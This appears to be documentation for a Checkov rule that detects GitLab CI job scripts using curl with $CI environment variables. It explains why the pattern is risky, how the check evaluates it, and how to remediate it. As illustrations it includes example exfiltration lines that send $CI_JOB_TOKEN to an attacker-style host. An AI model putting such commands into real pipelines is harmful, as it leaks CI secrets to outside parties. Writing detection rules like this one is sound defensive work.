# CKV_GITLABCI_1: Suspicious use of curl with CI environment variables in script
## Severity
**HIGH** (score: 8.0/10)

Piping CI/CD environment variables into a curl command is a classic pattern for exfiltrating pipeline secrets (tokens, credentials) to an external endpoint.

## Summary
This check flags GitLab CI job `script` lines that invoke `curl` while referencing CI environment variables (`$CI...`), a pattern commonly used to exfiltrate CI secrets to an external, attacker-controlled endpoint.

## Applicability
**Checkov framework(s):** `gitlab_ci`

Applies to GitLab CI pipeline configuration (`gitlab_ci` IaC type, check type `jobs`), evaluated against every line/entry within a job's `script[]` array (entity `*.script[]`).

## Why it matters
GitLab CI environment variables frequently include highly sensitive material: `CI_JOB_TOKEN`, injected deployment credentials, API keys configured as protected/masked CI/CD variables, and other secrets a pipeline needs to do its job. A `curl` command that references any `$CI*` variable inside a job script is a well-known technique for secret exfiltration — for example `curl https://attacker.example.com/collect?token=$CI_JOB_TOKEN` silently sends the token to an external server during pipeline execution, disguised as an innocuous-looking network call. This pattern shows up both in genuinely malicious injected code (e.g., a compromised dependency or malicious merge request modifying `.gitlab-ci.yml`) and in careless debugging code that accidentally leaks a secret to a logging/webhook endpoint. Because CI logs and job scripts are often visible to a wide set of contributors, and pipelines routinely run untrusted merge-request code, this is a realistic and frequently-exploited supply-chain attack vector.

## How Checkov evaluates this
For each line in a job's `script` block, the check tests whether the line (as a string) starts with `curl` and also contains the substring `$CI` anywhere in it. If any script line matches both conditions, the check FAILS for that job. If no line matches, the check PASSES.

## Non-compliant example
```yaml
deploy:
  stage: deploy
  script:
    - curl -X POST https://webhook.example.com/collect -d "token=$CI_JOB_TOKEN"
```

## Remediated example
```yaml
deploy:
  stage: deploy
  script:
    - curl -X POST "$INTERNAL_DEPLOY_URL" --header "Authorization: Bearer ${DEPLOY_TOKEN}" --data-binary @artifact.tar.gz
```
(Fix: don't pass raw CI-provided tokens like `$CI_JOB_TOKEN` to an arbitrary `curl` destination; use a scoped, purpose-specific credential and send it only to an intended, trusted internal/first-party endpoint, or avoid embedding secrets directly in the command line at all — e.g., use `--header @headerfile` sourced from a masked variable, and ensure the destination URL is not attacker-influenced.)

## Remediation steps
1. Review every job script flagged by this check and confirm the destination URL of the `curl` call is a trusted, expected endpoint (not something derived from untrusted input like a merge request title/branch name).
2. Avoid passing raw CI variables like `$CI_JOB_TOKEN` or deployment secrets directly in `curl` command-line arguments (they can leak via process listings or shell history); prefer piping via files, `--netrc`, or dedicated secret-injection mechanisms.
3. If the pattern is legitimate (e.g., posting a deployment status to an internal GitLab or Slack webhook using a masked variable), consider whether an equivalent GitLab-native integration (deployment tracking, `CI_JOB_TOKEN` scoping) can achieve the same goal more safely.
4. Restrict which CI/CD variables are available to job scripts using variable scoping/protection rules, and mask/protect sensitive variables so they can't be printed in logs.
5. Treat any unexpected occurrence of this pattern (especially introduced via an external merge request) as a potential secret-exfiltration attempt and investigate the commit's origin before merging.

## References
- [Checkov check source](https://github.com/bridgecrewio/checkov/blob/main/checkov/gitlab_ci/checks/job/SuspectCurlInScript.py)
- [GitLab Docs: CI/CD variables security](https://docs.gitlab.com/ee/ci/variables/best_practices.html)
